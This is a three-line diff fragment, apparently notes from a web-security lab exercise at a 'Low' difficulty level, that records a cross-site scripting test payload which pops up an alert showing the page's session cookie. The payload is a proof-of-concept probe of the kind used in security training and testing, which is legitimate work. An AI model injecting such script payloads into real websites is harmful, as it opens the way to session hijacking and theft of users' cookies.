@@ -1,0 +1,3 @@
+Low
+<script>alert(document.cookie)</script>
+result: creates an alert window displaying the session cookie
